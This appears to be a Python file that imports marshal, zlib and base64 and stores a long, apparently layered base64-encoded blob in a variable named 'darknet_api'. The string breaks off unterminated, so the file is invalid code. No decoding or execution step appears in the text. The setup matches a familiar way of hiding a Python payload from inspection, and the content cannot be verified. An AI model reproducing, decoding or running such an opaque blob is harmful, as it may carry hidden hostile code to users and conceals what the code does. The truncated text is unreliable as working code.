import marshal,zlib,base64
darknet_api = "VjIwMVMyUnRTbFJSYWtKaFZqTm9jMXBGWkc5a2JVcHdVVzVDYVZkRlNqSlpNalZTV2pGYVNGWnVUbUZXTWxJMVYxWmplRkpIU2toaVIzaHBZbXhHZWxOVmFFOU9WMHAwVkZoT1NsSXhXWGxYYkdNeFRVZE9NMk5ITVdwaVZHd3dVMVZvVTJKSFNraFdha0pvVW5wc01WUkhOVk5qTUhoMFYycEdhV0pWTkhkWlZtTTFaRmRPTlU1WVVtRlhSVFUyVjFaa2EySkhUalZSYmtKcFYwVktNbGt5TlZKYU1VbDVWbXBDVkZJeWVEWmFSV00xWlZkV1YxTnRlR3BYUmxweldYcE9VbU13YkVaYVIzaHJVbFZ3TWxwRlZrOWhSMHBJWlVkc1dsWXdOWGxWVm1NeFpXMVJlVlp1YkZaaVZsbzBXa1prVjJWdFVrSmpSekZxWWxSc01GTlZhRk5pUjBwSVZtcENhRko2YkRGVVJ6RlhaVmRPZEU5WWJHcGxWVXAzV1d4b1EyUnRUblZWVjJSV1RXeGFObGw2U25Oa2JVcHpVVzFvYWswd05IcFphazVMWVRGU2RGWnRlR0ZTTVZweVZXeG9TMlZYU1hwVFZYUmhZbXR3TWxsc1RrTk5SbkJZWlVkNGExSXlhREpaYldzeFlrZE9kVk51V21waWF6RnVXVlpqZUdReVNYcFRha0pLVWxad2VsbHFTVFZoTVZsNVVtNUNhMUpXV2pWWk1qQTFaVlZPZEZkdWJHbE5ha0p1V2tWa2MyUkdjRlJSYmtKcFYwVktNbGt5TlZKYU1rMTVaVWQ0WVZkRlJreFpWbU40WkRKSmVsTnFRa3BTTTBJMldXcEpNR015VG5SV1dFNXFUVEo0TmxSRll6VmxhMDUxVlc1c2JGWkhPVXhUVlU1Q1dqSkdXRTFZWkdsTk1HOTNVMVZvUzJKSFRsbFdiWGhxVFRGS05sRXliRUphTUd4SVYyNXNhVTFxUW01WFZ6Vk9UVVZzU0dKSVVtcFNlbXcxV2tWT1ExRXhjRmhTYWtaclVqSjRkRnBHWkRSV1IwbDZWbTVrUkdKV1dUQlhWRXBYWkRKU1JXSXdkRXBSTUVadVdUQm9TMk5IU25WVlYyUk1VVEJ3U2xsc1kzaGtSV3hHWlVoYWFVMXVValpUVldRMFkwZEZlVlpYWkZWV2VteHlXa1prTkdKRmJFZFRiWGhxVjBaYWMxbDZUbE5sYTJ4SVVtMXNZVkV3U2tSWk0zQlNXakpHV1ZSWFpHbGlWR3QzVTFWa2MyUlhUWHBWYldocFVqTmtibGRGV2pSa1ZXeEhWVzVhU2xJeWVERlplazVUWVVkS1NHUXlaRlpTTTJoelYxWm9UMkpGYkVkVmFsWnFVakZXYmxrd1pITmtNR3hJWWtoV2FrMHhTbTlaYTJReldqSk9kRlp1YUd0V01WbzJXa1ZvVGxveGJGaE9WM1JLVTBWS2Qxa3dUa05qUjBwMVZHcENXbFl6YUhwVFZXUkxaV3MxUkZOWVFrUmhWVVp1VTFWb1QwNVhUalZPVjNoc1VqSjNkMU13VG5KVE1XdzFVVlJzU2xORmNITlpNV2hYWWtkTmVsVnVjRTFpUlRWeldYcE9UMk5IU1hsT1J6bE1WVmhDZDFkdGJFTmtWMGw2VlZka2FVMHdNVEZaTUdSSFRVZEdSRTVYZUd4U01uZzJXa1ZvVG1Jd2JIVlViWGhxVFRBMWQxbHFTVEJoVlhSVllqQjBTbEV3Um01VFZXTTFaV3Q0ZEUxWGFHaE5iRnB5V1Zab1MyVnJkRVJUYm5CaFYwVTFObGxXWXpWa1ZXeHdZVEIwYWxORmNIZFpiVFZTWWpCc2NVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5V1FsVk5SR3hSVmtSQk5WVkdVWGRQVmtKVlRVUnNVVlpFUVRWVlJsRjNUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUjJ4TVZWaENNMWt5TVhOa1YxSkVXakpzV1ZOSFpEUlhWM2g2WkRBNU5sUllaRkJsYkVZMVdXeE9TbG93ZERWUlYyeEtVVEJHYmxOVlRrSmFNR3hFVVZka1NsSnJOWEZaTWpGelpESlNSRkZyVW1waVZWcHhXVlJLVjJFd2JFUlhWMlJYVTBWd2IxbHROVTlqTVd4WlZXMTRZVkV3U25CYVZrNURWVlpPUmxSWVVsVldNRnA1V1ZaV1MyUnNXa1JSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrU2xFd2JHNVRNMnhDWVZab1NWb3phRnBpU0U0eldXeE9TbU5GVG5WUmJteG9WbnBWZDFNd1RrcFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5V1FsVk5SR3hSVmtSQk5WVkdVWGRQVmtKVlRVUnNVVlpFUVRWVlJsRjNUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUkd4UlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFWc2NHRXdkR2hXTVd4dVdXdGtWMlJWZEVsVWFsWnFaVlJXYjFreU1XdE5hM1JWWkROc1VGb3lPVzVUVlU1RFpESk9kR0pJVm10Uk1FWjJVMWQ0VjJWc2JGaGFSM2hLVWtjNWJsa3dhSE5OUjBaSVQxaFdTbEo2Um05WlZtTXdaRmRPU1dFeVpFeGxiR3cxVTFkc2NsTXdiRVJSVjJScVRUSjRObFJITVZkT1IwWlpWVmM1VGxVeWRFeFhWRTV6WVcxS1NGWlhaRkZWTUVZelVUSTFRMlZYUmxoT1ZFSk1VVEJ3VkZkc1pFOWtiVXBZVFZkNGFXSldTbk5YYTA1RFlXMUtTRkp1UW1sWFJURnVWak53Um1SRk1WVlJXR1JaVlRCc2QxRXlNVTlPVm10NVpVZDRTbEpFUW01WlZtTXhaREpTV1ZWWE9VcGhNbWd5V2toc1EyUkdiRmhPVkZaS1VqQTFlbGRXWkhOa1IwNDJZakprU21GWGRFeFhhMlJYWWxWc1NWVnFSbWxpVjFKMVdrWk9iMDVGZEZWaU1IUktVVEJHYmxOVmFFOU9WMDQxVGxod2ExSXhTakphUm1oU1pGWndkR1ZFUm1wTmJXUjJVekZHZGxvd2JFUlJWMlJoWWxSc05WTlZhRXRpUjBwWVVtNUNhV0pYZURGWGJteERZMGRLY0ZGdWJGcFdlbFoxVjJ4T2IwNUZlRVJSV0dSTlVUQkdNRlJXVG5KT2EwNXdVVmRrU2xFd1JtNVRWVTVEWlcxV1dWUllWbXBOTVVweVdXcE9WMDFGZUhSWGJrNXJWMFUxZGxNd1RuSlRNR3hFVVZka1NsRXdSbTVUVldoUFl6RndXRlp1WkV4U1JWWjNVVEkxVjJGR1FsbGpNbXhYVjBVMWMxa3lhM2hSYkc5NVZtNVdhMUV3YXpKVFZVNUxWRzFKZW1OSVFtbFNNMmh2VkVod1ZtUlZNVVJSVnpsVlVqSjRNVnBHYUc1T01HeEdVbTVXWVZORmNESlpWbVJTV2pBMVZFNUlhRkJsVlVwRFZGWlNXbVF3TVRWUmEwNXJWako0ZWxkclRUVlVWbEpYWVhwQ1QwMUhjek5UVldoclRXdDBWRkZyU21wVFJVcDZWMnhhYTJKR2JISmtTRUpyVVhwbmVGUlljR3BrVlRFMlYxZGtURkpZVWtwV2ExVjRWRlY0UkZGdVRtaFdNMUp6VTFWV2EySkdhM2xrU0ZwTVZUQktXRmRzYUV0bGJVWllUMWhXVFdWc1JqRlVWVTVEVWtkR1NWTnVXbWxXTVZZeVZHdFNUbVJWTVVST1NHeE9aV3hWZWxSSGNFWmxWVEZVVVdzMWFVMXJjSGRaYTJSV1dqRlZlVkp0TVZwWFJYQjNWRWh3Vm1Wck5UVk9TSEJQWVZWdk5WRXlNVWRrTWtaWFQxaENZVkV3UlRWVFZWSnFaVVUxTmxWWWJFOVZXRUp2V1RCa2MxcHRSa2hTYm5Cb1VUQkZOVk5WVG1wbGF6RnhVMVJHVG1Gc2NISlVWekZPWldzeE5sWllaRnBoYTFweVZGaHdWbVZyTVVoVmJYaE9aV3RyZWxkVVNscGtNRGxJVkZoa1QyVlhUa3haTUdSdlpHMUtkRlp0V21saWJGb3dWMWN4VjJWVmJFVk5SMlJxVFRKNE5sUkhNVWRsVm05NlYyMUtUbFpxUWt4WFZFbzBZMFp3V0U1VVFrcFNSRUp1Vm10a1YyTXhjRmhhU0d4YVZucEdSVmxyWkhOaVIwcDFWVmM1U21Kck5YTlplazVQWTBkSmVVNUlXa3BoV0ZJeldWVmpOV1JXY0ZkUFdGWnJWbnBHY0Zkc2FFcGpNR3hJVW01a2FGWnFiSGRYYTA0eldqRnNXVkZ1UWxsTmJXaHZXWHBLYm1ORlRuUlViazVvVmpGYU1WcEZUVEZoYlVsNVRsaFdZVll3TkhkVE1FNXlVekpHV0ZkWFpHbGlWR3QzVTFWa1QyTXlSbGhXYmxaclVYcFdkMWw2UlRWTlYwMTVWbTVzV1UxcldYaGFSV1J2WkcxT2RHSkVXbUZXTVVaMlV6RlNkbE13YkVSUmFrSnFZbTF6TWxFeWJFSmFNR3hFVVcxd2FWSXllSE5aYlRWU1pGZE5lVlp1Vm1GU2FteHhXV3BLVTJKR1ozcFRiWGhxVjBaYWMxbDZUbEppTWs1SVlVaGFhV0pXV20xWmJUVlhaRVpzZEZadWJFeFZWemx1VTFWT1Fsb3lTbGhXVjJSUlZUQktjVmxyWkhOaVIwcDFWVmhXYWsxdGVIVlpiWGMxWTBkS2NHRklaR2hTZW13eFYyeFpOV1JYVWxoTlYyeGhWMFZzZWxOVlpITmtWMDVKVm1wQ1RGRXlVa2RaYlRWVFlrZE9jRkZzY0dsTk1WbzFVMVZXVDJSc2NFaFdWMlJRWVZWR2RWTXhUbkpUTUd4RVVXMTRiRkl3TlhOWk1HaFNXakZWZVZadWNHcE5iWGd5V1cxNFEyRkhUWHBVYWs1cFRUQndjbFpITVZkaVJuQklWbTEwVTFkRmNEVlphazVLVG10T2NGRlhaRXBUUlVwdldYcE9UMDB3YkVWTlIyUm9WbnBXTTFwR2FGSmlNR3h6WWtoYWExZEZiRzVVVnpGaFlVVnNSMUZ0YUdwTk1EUjZXV3BPUzJFd2JFVmlNbVJLWVZkMFRGTlZUa0phTWtwWVZsZGtVVlV3U25GWmEyUnpZa2RLZFZWWVZtcE5NVXB2V1RJMVVtSXlUa2hoU0ZwcFlsWmFiVmx0TlZka1JteDBWbTVzVFZORlNtOVplazVQVFRCMFVtTklVbXhYUlRWeldXdGtXbG94UWxSUmJYQnBVako0YzFsdE5WSmtWbTk1Vm1wQ1dVMXFSbk5UTUU1eVV6SkplbFJZVm1wTk1uZzJXa1ZrVjJSRmRFUlRiWEJwVWpGYWIxa3liRXBqUlU1MVVXNXNhRlo2VlhkVE1FNUtUMVpDVlUxRWJGRldSRUUxVlVaUmQwOVdRbFZOUkd4UlZrUkJOVlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5VmJIQmhNSFJxVTBWd2QxbHROVkppTUd4elpVUlNUbFl3Y0dsVVZWSjZaV3N4UldONlFrNWlWRUp3VTFWT2Vsb3diSEJSVjJSS1VUQkdibE5WVGtKYU1HeEVVV3hTV2swd2NIZFpNR2hTV2pGRmVsTnRhRnBOYmxKelYydE9RbUpWYkVkVmJteGFWbnBXTmxsclpFZE5SbkJZVlZka1dtSnRkRzVXVlZadlVrVjRWazFYYUdoTmJYaEVXV3BHVWxvd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZHNTbEV6VG01VFYzZzBUa1V4V0ZOdFNrNVNla0p3VXpGR2QyUXlUblJpU0ZaclVUSmtjRlZHVVhkUFZrSlZUVVJzVVZaRVFUVlZSbEYzVDFaQ1ZVMUViRkZXUkVFMVZVWlJkMDlXUWxWTlJHeFJWa1JCTlZWR1VYZFBWa0pWVFVSc1VWWkVRVFZWUmxGM1QxWkNWVTFFYkZGV1JFRTFWVVpSZDA5V1FsVk5SR3hSVmtSQk5WVkdVWGRQVmtKVlRVUnNVVlpFUVRWVlJrNUtZMFZPZFZGdWJHaFdlbFYzVTFWT2JtRldXWGxXYms1YVRXcHNNRmRzVGtOV1YwbzFVV3RPVjFKVk1XNVZWRW8wWTBacmVXTXlaRkppVkd0M1UxZHNOR1JIVmxsVWJYaHBVakZzTVZkdE1YTmxWMDE2VlcxYWFXSlZXakJYYkU1eVV6Sk9TVk51UW1saWJFWnVVekJPUzFaSFVraFNibXhyVWpKNE1WZHViRU5TUjBwSVVtNUNhVlY2VWpGVVIyc3daRlY0Y0ZKWGJFeFZXRUYzV1RJMWNrNXJUbkJSYlhCb1VqQmFNVmx0TVZkak1XZDVWbTVXYTFJeWQzZGFWbEY0WVcxS1NHSkhlR2xpYkVZeFYycEtWMDFHWjNsV2JsWnJVakozZDFwV1RtNWhWa1pHVTI1Q2ExSXdOVEpaVm1NeFVrZEtTR0pIY0doTlZHeHdXV3BPVW1GVmRGSmlNbVJhVFcxb2IxbHRNREZpUjBwSFQxUkdhazFzV2pWWmJURkhaRVp3VlUxSGJGSlNWWEIzV2tWa1QyUnRSbGhPVlZKcFVqSjRjVmxVUlRWaFYwbDZWVmRzUkdGVlNuUlphazVLV2pKR1ZGRnVRbWxoVlVvMVYxWmpNV0pzY0ZSaFNFSnBZbXhHZGxkVVRuTmhiVXBJVmxoQ1RGWkhPVXhUVlU1RFlXMUtTR0pIZUdsaWJFWXhXWHBLVjJSV2NFZFBXRkpoVjBVMU5sZFdaR3RpUlhSSVZtNVdhMUl5ZDNkYVZsRjRZVzFHU0ZKdVZtbGlWbHA2VjBSS1YyUlhVa2hpUkVKc1ZUTm9NRmRzYUU5bGJHeFlXa2Q0VVZVd2NHcGFWV1JhWkRGb1NWcDZWbUZpU0djd1ZERlNZVmt5VmtoU1ZFWktVbXh3ZDFsNlNuTk5SV3hKVkc1Q2ExSXhXalpUVjJ4eVV6QnNSRkZ1Y0dsU01WcHpXVEJPYm1WcmRGSmlNbVJLVTBWS01sbDZUbE5sYTJ4RlRVZGtXazF1YUhkWGJHTXhUVVYwUmxwSGVHdFNWMmgzV1hwT1UyUnRUblZpUms1aFYwVlplRmRzYUU5TlJYUkpVVzE0WVZkRmF6VlhWRXB2WVVkS2RFNVhlR2xTYW14eldXMDFVMk5IVWtsaE0wNXBVako0TUZsV2FGSlBWVEZVWlVoYVlXSldjRFpYYkdoVFdteHdTRkpxUW1GV1JFWlFXV3BKTVdKRmVFaFBWekZoWW1zMWMxcEZXVFZqUm5CRlRVaGtUVko2Um05YVZWazFZMFp3UlUxSVpFMVNla1ozV1cxM05XTkdjRVZOU0dSTlVqQmFjbGRyV1RWa2JIQjBWMjV3WVZkR1JUVlVWVTQwWWpGc1dWUnRPVkZXUlVaM1V6RkdkbG93YkVoaVJ6RktVMFZLTWxsNlRsTmxhM2gwVFZkNGFrMHdOVzlYYWtwWFpXeGtObEZ0VWsxaVZFWnpXWHBPVDJGR2IzbFdXRlpoWWxkNE1WZHJUbTVoVmxWNVQxaHNhbUp0ZEhwVFZXaFRZakZ3V1ZOdGVFcFNNRm8xVjJ4T1EyUlhTalZSYmxaaFYwZE9ibGRXWkZObGEyeElVbXBLV2xZeWVIcFhWbVJMWXpGd1ZGTllRa3BSTUZVMVUxVk5kMlZGT1c1aU1tUktVVEJHYmxOVmFFTmxWMFpZVGxSQ1NsRXlaSEJWVm1SVFpXdHNSbEp1YkdGVk1FcFJXa1pvVWxveFdrbFRhbFpLVWxWYWRWZFdaSE5rVld4SFZXNWFhVlo2YkRWWk1qQTFUVEJzY0dFd2RFcFJNRVp1VTFWT1EyRnRTa2hpUjNocFlteEdNVmw2U2xka1ZuQkhUMWhTWVZkRk5UWlhWbVJyWWtWMFNGWnVWbXRTTW5kM1dsWlJlR0Z0UmtoU2JsWnBZbFphZWxkRVNsZGtWMUpJWWtSQ2JGVXphREJYYkdoUFpXeHNXRnBIZUZGVk1IQnFXbFZrV21ReGFFbGFlbFpoWWtobk1GUXhVa3RaTWxaSVUxaGtTbEpWY0c5WmEyUkhaRlpyZVZaWGJFeFZWemx1VTFWT1Fsb3diRWxVYms1aFZqRmFNMU13VWxaalJVNXdVVmRrU2xFd1JtNVpNR00xWlcxU1NWUlhaRkZWTUVweFdXdGtjMkpIU25WVlZ6bFRUV3haZDFVd1pITmxiVkpJVDFoc2JGWnJjSE5aTVdoWFlrZE5lbFZYT1dwU01WcHpXVEp2ZUdGdFJraFNibFpwWWxaYWVsZEVTbGRrVjFKSVlrUkNiRlV6YUhwWlZtTjRZMGRTUlUxSWFFMVNlbXgwVjIwMVQySkhVa2RQVjNSYVYwWktjMVZHVlRGa2JVcDBWbGhPYVUxc2NIUlpla3BYVFVabmVXSkhkRkZXUlVaNldXeGtSMDVHWjNsaVIzUlJWa1ZHZWxsc1pITmtWbWQ1WWtkMFVWWkZSbnBYVm1SVFlURm5lVTlYTVdGaWF6VnpXa1ZSZDJRd2VFaGhSMmhxVFcxak5WUlZUbkpqUlU1d1VWZGtTbEV3Um01WmJHUlhaVzFOZVZKdE5XRlZNRVUxVTFWb1EyUnRUWHBWYm5CTllsUkdjMWw2VGs5aFJtOTVWbTV3V0dWclNtdFVSekI0WWtkTmVsUnRhR0ZOYkZaTVUxVk9RbG93YkVSUmJtUnFZbGQ0TVZwRlRrSmlNa3BZVm01d2FrMXJXblZYYkU1eVV6QnNSRkZYWkVwUk1FbzJXbFpvVG1SV2NGbGhTRUpyVVRKa2QxRXliRUphTVhCWVpVaHdZVlpIT1V4VFZVNUNXakJzU1ZWdWJHeFdSemxNVTFWT1Fsb3diRVJSYWtacVlsaGtibFZHVGtOa01rbDZWR3BDYW1WVVZqQlhiR2hQWld4c1dGcEhlR3BOV0U0elYwWk5NV1ZXY0ZsUmJrNXNWbXBzTUZkV2FFdGpiVkpaVVZoV2FtSlVhM3BaZWtaNlpERm9WRTVYYkd0WFJrbDNXV3BKTVdWc1pEWlJiVkpOWW14YU5WbHJSblphTUd4RVVWZGtTbE5GTkRGWk0yc3haVzFTU0ZWdVdtdFhSa1l4VjIweE5FMVhUWGxhTWpsTVZWYzVibE5WVGtKYU1HeEpWR3BXYW1WVVZqWmFSV1JUWkcxU1dWVllWbXROTUhCM1drVmtWbUl3YkhObFNGWlhZbGQ0TmxsV2FGSmFNR3h3WkVSR2FtSllaSGRSTW14Q1dqQnNSRkZYWkdwTk1uZzJWRWMxVDAxR2NFaFBWRVpyVVhwV2RGbHJhRmRsYlVaRVdqTkNSR0ZWUm01VFZVNUNXakpHV0ZWWFpGRlZNRW96V1dwT1QwMUhUalZPV0ZKaFYwVTFObGRXWkd0aVIwMTRZek5rV1ZWNlZuZFhhMFoyV2pCc1JGRlhaRXBUUld4dVZVWk9RMkZyZUhSYVIzaHJVVEpuZUZreU1UTmpNR3hJWVVkNFdsWXhTbk5aTWpWT1QxZFNXRkpZVGtwVFJrcDNXV3hrVjJSdFVsbFZWR3hPVmtaV2VsTlZaRWRqTWtwSVQxUk9XVTB3Y0hOWGEyUnpaVlp3V0ZScVFtcGxha1pXV1RJMVYySkZkRkppTW1SS1VUQkdibE5WYUU5a2JWSlpVVmRrVVZVd1NrUlhiR1JIVFZkU1NHSkhNV3RXTTJoVldXcE9WMlF3ZEVsVFdGWmFUV3BzTVZwRlpGZGtWMUpFWkRKc2FGTkdTakJaYTAweFpERnNXVk51Y0dGWFJXeHdVekZHZGxvd2JFUlJWMlJLVWpKNGRGTlZhRTlrYlZKWlVWaFdZV0pYZURGWGEwNXVZVlp3U0dKRVNrcGhXR2h4V1d0a1IyVnRUWGhQUkd4S1lsZE9NRmt5TVZkaGJHeFpVV3BDV2sxdGFHOVRWMnh5V2pKR1dWUlhaRlZpVkd3eFYyeE9RMkZIU25SVlYyUnFUV3ByZUZrd1RURmlWMFpZVGxkMFRGRXlVbkpaVm1oYVltdDRSRkZ1UW1GU1JFSndXVlZrVjJGR2NFaFRiV2hxWVZWc2QxTlZaSE5sYTJ4R1RsaGFhV0pXVlRKUk1teENXakJzUkZGWFpFcFJNRVp1V1hwS05HSkdjRmxSVnpsT1lWZDBURk5WVGtKYU1HeEVVVmRrU2xFd1NqTlphazVQVFVkT05WRlViRXBTTURWNldWWmtWMlJYVWtSaFJXaGhWMFpLU2xsV2FFOU5SMGw2VTJwV1ZtSldXalJhUm1SWFpXMVNSR0ZJWkdGV01WbzFWVVprVDJJeGJGaE9XRlpoVmpOb2JWZHNZekZOUjBaWlZXcFdUVkl6YUhkWmJHUnpUVVpDVlZKWVRtbE5iSEIwV1hwS1YwMUdaM2xWYldoclVqRlZOVlpITURWa1ZuQlVaVWhhWVdKV2NEWlhiR2hUV20xR1dGVlViRTVSTTJnd1YxWm9iMXB0UmxoVlZHeE9VVE5vTUZsV1l6RmFiVVpZVlZSc1RsRXphRzlYYTJSVFdtMUplVmR0TVdwTmJGbDNWVVpTUW1NeVJraFNibkJvVWtSQ00xTXhUbkpUTUd4RVVWZGtTbEV3Um01VFZVNURaRVp3V1ZSdWNGcFdNbEp6VTFWUmQxb3lUa2hQV0hCclUwVXhNVmxzWkZkbGJVMTVVbTAxWVZkRk5XbFVWVmwzWkZkS1dGWnVjR3BOYTFwMVYyeEdkbG93YkVSUlYyUktVVEJHYmxOVlpITmlWV3hKVVc1YWFrMHhTalpVUnpCNFlrZE5lbFJ0YUdGTmJGbzJWak53UTFwRmVIUk5WM2hxVFRBMWIxZHFTbFprVm5CMFlraFdZVkV5WkhCV01XTTFUVlZzU0UxVVJtcE5NVVp1V1hwT1UyRkhWbFJUV0VKS1VUQlZOVk5WVFhkbFJXeElUMWhzU2xORlNqSlplazVUWld0NGRFMVhlR3BOTURWdlYycEtWMlZzWkRaUmJWSk5ZbFJHYzFsNlRrOWhSbTk1VmxoV1lXSlhlREZYYTA1dVlWWldTR1ZIZUZwWFJUVnpVMVZvVDAxR2JGbGhNbVJwVFdwU2NGTXhUa0poUmtKVVVWaFNUbFpIT1V4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1EyVnNjRmhVVjJSUlZUQktOVmRzVFRGaVYwWllUbGQwV2xZemFIcFRNRTVxWWpGamVHVkhUbUZSZWxaclV6SjRORmt4Y0VSak0wSkxaVmhrYmxsc1pGZGxiVTE1VW0wMVlWVXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTAxSFVsaE9WelZoVFRGV2RsbFdZekZOUlhSSlZHMTRXazFZVGpOWFJrNXlZMFZPY0ZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSVjJScVRUSjRObFJITlU5TlJuQklUMVJHYTFGNlZuUlphMmhYWlcxR1JGb3pRa1JoVlVadVUxVk9RbG93YkVSUlYyUktVVEJHYmxsNlNqUmlSbkJaVVZjNVRsVXlkRXhUVlU1Q1dqQnNSRkZYWkVwUk1FWnVVMVZPUTJWdFZsbFVXRlpxVFRGS2NsbHFUbGROUlhoMFYyNU9hMWRGTlhaVE1FNXlVekJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRVJSYm1ScFRUQTBkMWt6YkVKUFZXeElWRzVPYUZZeFdqRmFSVTV2VTBad1dWVnJiR2hYUlRSM1dXcE9TMDVXVm5SV2JtaHJWakZhTmxwRlRtOWtNWEJZVm01c1VWWXdOWFpYVm1NeFpGWndXR1ZIV21GV2VsVjNXVlpvVTA1VmVFaGxTRUpwVmpKM2QxVkdVa3BqTWtsNVYyMHhhazFzV1hkWFJFcFRZVWRTU0ZaVWJGVmlWR3d4VjJ4T05HUnNjSFJYYm5CaFYwWktiVmxXWkZKUFZURkVaVWhTV2xkSGFHMVpWbVJTVDFVeFJHVklVbWhXZWxadFdWWmtVazlWTVVSbFIyaGhVakZLYlZscVNtRmlWMDE1Vm1wQ1VWWkZSbnBaVldSSFpXMUdSVTFJWkV4Vk1uUk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa05rUm5CWlZHNXdXbFl5VW5OWk1qRlhaV3RzUlUxSFpHcFNlbXcyV2tWb1RtUlhTbGhXYm5CcVRXdGFkVmRzYUU5WmF6RlhUVWhXYVZZeFdqWlpla3BIWW14d1VtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVMFUwTVZremF6RmxiVkpJVlc1YWExZEdSakZYYlRFMFRWZE5lVm95T1V4VlZ6bHVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZhRTlqTVhCWVZtNWtURkpGYkhkUk1teENXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3lUWHBpU0hCTlltczBkMWRyWXpWTlYxSkVUbGN4YVZOR1dqWlpWVTV1WTBWT2NGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUnFUVEo0TmxSSE5VOU5SbkJJVDFSR2ExRjZWWHBaTWpGelRVWndWRm95YkVwVFNHYzBVMVZPU21OdFNsaFdibkJxVFd0YWRWZHNhRXRpUjA0MVl6SnNTbEp1YURGVFYyeHlVekJzUkZGWFpFcFJNRVp1VTFWT1EySkhTa2xVYlhoUVdqSTVibE5WVGtKYU1HeEVVVmRrU2xFd1JtNVRWV2hEWVVkTmVsUlZkRXBSTUVadVUxVk9RMkpIU2toaVJ6RktVMFUxTWxwR2FFSmtWbkIwWWtoV1lWRXlaSFZYYTJSelRXdHdOV1F5WkdoV01VVTFVMWN4YjJKR2JGaFZiV3hhVjBWc2NGTXhUa05qUjA0MVVXNVdhVTB4Um01V1J6QTFaRlp3VldJd2RFcFJNRVp1VTFWT1Fsb3diRVJSYlRGcFRUQnNibGRyWkVkTlJXeElZa2hXU2xORk5USmFSbWhDWkZad2RHSklWbUZTYW14dldXdGtNMkl3YjNsVmJrSnJZVmRPZWxkVVNqUmhSMDE2VkcxYVVWVXdjSEZaYWtreFRVWnNXR0pJVm1GWFJXd3dWMjB4TkUxWFJsaFZWMnhNVmtjNVRGTlZUa0phTUd4RVVWZGtTbEV3Um01VFZVNUNXakZyZVU5WGRHRlZNRVUxVTFWa1UyRkhVa1JPVnpWaFYwWkdkbE5xU2xOaFIxSklVbGhTV2sxcWJISlhiRTVxWTBWT2NGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVMFpLZDFsc1pGZGxWV3hGVFVka1lWSXdXWGRVUnpGcllrZFNSRm95TldGU01GbDNWMVpOZUUxSFJsaE5WM2hxWVZkT2QxRXliRUphTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzU1ZWdVdtaE5iRm94VjFaT1FrOVZiRWhWYldoclVYcFdkVmRzYUZKaU1HOTVWVzFvYTFJd1ZqQmFSV00xWTJ4d1dFNUhOVXhWVnpsdVUxVk9RbG93YkVSUlYyUktVVEJHYmxOVlRrTk5SMUpZVGxjMVlVMHhWblpaVm1NeFRVVjBTVlZ1UW1sV01WbzFVekZPY2xNd2JFUlJWMlJLVVRCR2JsTlZUa0phTUd4RVVWZGthbUZWUlRWVFZXUk9aRmRPU0U5WWNHdFJNbVJ3V1ZWb1UwMUhUa2xVVkZwTlpWUnNjbGxxU210aVJtdDVaVWhDV2sxdVRqRlhWRWsxWkVWM2VsTnRlR3ROYTFvMVYydE9TbU14Y0VoU2FrSmFWa1JGTTFOWE1VOWtiSEJJVmxkc1VHSlZOVEpYYTJSV1l6QnNkVlZ1V21oTmJGb3hVMWR3ZDAxSFNYbGtSM2hwWWxWWk5WUkZUa05pTVhCWVVtMTBZVmRGY0RaVlJtaFhZVVY0UkZGcVFtaFdla1p6V1dwT1YwMUdRbFZTVkVaTlVUQktiMWxyWkRSa2JWRjRUMWhzWVZZeFNuZFpNakZYWVcxU1NWUlViRmRUUlc5NFYyeE9jbE13YkVSUlYyUktVVEJHYmxOVlRrSmFNR3hFVVZka2FHSnJNVzVWUms1RFkxZE5lVTlZVmsxaVdHZ3lWMVprVTJWcmRFbFRXRlpyVWpGWk1GcEZUbkpUTUd4RVVWZGtTbEV3Um01VFZVNUNXakJzUkZGWFpHcE5NbmcyVkVjMVQwMUdjRWhQVkVaclVYcFZlbGt5TVhOTlJuQlVXakpzU2xOSVp6UlRWVnB6WkcxU1ZGRnRlRnBYUlhBeFYyeGtVbG93YkhCa1NFWnFUVmhPZFZreU1WZE5NV3haVTIxMFMwMVVRbmxUVjJ4RFVURmFSbFJYYUVwaFYzUk1VMVZPUWxvd2JFUlJiWGhwVTBVMWMxUXlaSFphTUd4RVVWZGtTbEV3Um01VFZXaFBUbGRPTlU1WWNHdFNNVW95V2tab1VtUlhVWHBUYmtKclVqRldkbE5YYkVOUFIxcEVVV3RTV2xkRlNYZFhWRXB2WVVWc1JsVnRlR3RTTVZweFdrVmtWMkV3YkhCaE1IUktVVEJHYmxOVlRrSmFNR3hFVVc1d2JGZEZNVEZaZWs1VFlUSkplbFpxUWsxaVZuQjZXa1pvVDJJd2RFUmhNSFJLVVRCR2JsTlZUa0phTUd4RVVXNXdiRmRGTVRGWmVrNVRZVEpKZWxacVFrMWlWbkI2V2tab1QySXdkRVJoTUhSS1VUQkdibE5WVGtKYU1HeEVVVzV3YVZJeFduTlpNRTV1WlZWMFVtSXlaRXBSTUVadVUxVk9RbG93YkVsVWFsWnFaVlJXTmxwRlpGTmtiVkpaVlZoV1lXSllaM2haZWtwdVlqQjBVbUl5WkVwUk1FWnVVMVZPUWxvd2JFaFViazVvVmpGYU1WcEZUbTlUUm5CWlZXdE9hVTB4U2tWWFZtUTBZekZzZEZKdGNHaE5SVm94V1hwT2EySkhUbk5UYlhocVYwWmFjMWw2VGxKaU1FNXdVVmRrU2xFd1JtNVR